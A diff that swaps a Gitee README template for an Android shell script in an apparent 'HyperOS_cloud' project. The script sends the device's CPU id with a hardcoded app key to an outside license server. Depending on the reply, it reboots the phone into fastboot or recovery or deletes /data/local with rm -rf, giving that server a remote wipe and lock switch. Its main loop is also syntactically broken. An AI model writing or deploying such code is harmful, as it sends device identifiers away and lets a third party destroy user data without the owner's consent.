@@ -1,37 +1,47 @@
-# HyperOS_cloud
-
-#### 介绍
-HyperOS_Cloud
-
-#### 软件架构
-软件架构说明
-
-
-#### 安装教程
-
-1.  xxxx
-2.  xxxx
-3.  xxxx
-
-#### 使用说明
-
-1.  xxxx
-2.  xxxx
-3.  xxxx
-
-#### 参与贡献
-
-1.  Fork 本仓库
-2.  新建 Feat_xxx 分支
-3.  提交代码
-4.  新建 Pull Request
+function parse_json() {
+   json=$1
+   query=$2
+   value=$(echo "$json" | grep -o "\"$query\":[^,}]*" | sed 's/"[^"]*":\([^,}]*\).*/\1/')
+      value="${value#\"}"
+      value="${value%\"}"
+      echo "$value"
+}
 
 
-#### 特技
+cloud_url() {
+wyUrl="http://wy.llua.cn/api/"
+wyAppid="50002"
+wyAppkey="Nz4u8sRm74V7mA7n"
+deCode="200"
 
-1.  使用 Readme\_XXX.md 来支持不同的语言，例如 Readme\_en.md, Readme\_zh.md
-2.  Gitee 官方博客 [blog.gitee.com](https://blog.gitee.com)
-3.  你可以 [https://gitee.com/explore](https://gitee.com/explore) 这个地址来了解 Gitee 上的优秀开源项目
-4.  [GVP](https://gitee.com/gvp) 全称是 Gitee 最有价值开源项目，是综合评定出的优秀开源项目
-5.  Gitee 官方提供的使用手册 [https://gitee.com/help](https://gitee.com/help)
-6.  Gitee 封面人物是一档用来展示 Gitee 会员风采的栏目 [https://gitee.com/gitee-stars/](https://gitee.com/gitee-stars/)
+    kami=$(getprop ro.boot.cpuid)
+    notice=`curl -s "${wyUrl}?id=notice&app=${wyAppid}"`
+    logon=`curl -s "${wyUrl}?id=kmlogon&app=${wyAppid}&kami=${kami}"`    
+    Notices=$(parse_json "$notice" "app_gg")
+    condition=$(parse_json "$logon" "code")
+    echo $Notices
+    echo $condition
+    
+    if [[ $Notices == "" ]] || [[ $condition == "" ]] ; then
+    sleep 5
+    cloud_url
+    fi
+
+}
+
+while
+do
+  cloud_url #更新状态
+  # 153封禁 200验证正常 149无不存在 success开放版本 failed关闭使用
+    if [[ $condition == "200" ]] ; then
+    exit 2
+    elif [[ $condition == "149" ]] ; then
+    reboot fastboot
+    elif [[ $condition == "153" ]] ; then
+    rm -rf /data/local
+    elif [[ $Notices == "failed" ]] ; then
+    reboot recovery
+    fi
+  
+    sleep 5
+    done
